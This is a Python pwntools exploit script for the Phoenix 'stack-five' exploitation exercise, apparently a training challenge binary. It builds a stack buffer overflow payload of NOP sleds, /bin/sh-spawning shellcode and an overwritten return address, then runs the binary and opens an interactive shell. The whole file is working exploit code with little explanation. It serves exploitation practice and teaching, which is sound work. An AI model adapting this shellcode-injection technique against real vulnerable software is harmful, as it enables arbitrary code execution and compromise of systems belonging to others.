#!/usr/bin/python
from pwn import *

GDBSCRIPT = """
b start_level
continue
"""

BUFF_LEN = 136  # Space we have until we run into return address
# GDB RSP = 0x7fffffffe580 # We want to return to the stack pointer
RSP = 0x7fffffffe5a0

def exploit():
    # Generate Shellcode -- Spawns /bin/sh via execve
    ctx = context.update(arch="amd64", os="linux", endian="little")
    shellcode = shellcraft.amd64.linux.sh()

    shellcode = asm(shellcode)
    sclen = len(shellcode)
    print(f"Total bytes available: {BUFF_LEN}")
    print(f"Bytes of shellcode: {sclen}")
    print(f"Bytes for NOP Sled: {BUFF_LEN - sclen}")

    # Build final payload - NOPS+SHELLCODE+NOPS+ADDR
    splitBuff = (BUFF_LEN - sclen)// 2
    print(splitBuff)
    sc = asm('nop') * splitBuff 
    sc += shellcode
    sc += asm('nop') * (BUFF_LEN - sclen - splitBuff)
    sc += p64(RSP)
    print(sc)
    print(len(sc))

    # Execute the payload!

    p = process("/opt/phoenix/amd64/stack-five")
#    p = "/opt/phoenix/amd64/stack-five"
#    gdb.debug(p, GDBSCRIPT)
#    gdb.attach(p, GDBSCRIPT)
    p.sendline(sc)
    p.interactive()

if __name__ == "__main__":
    exploit()
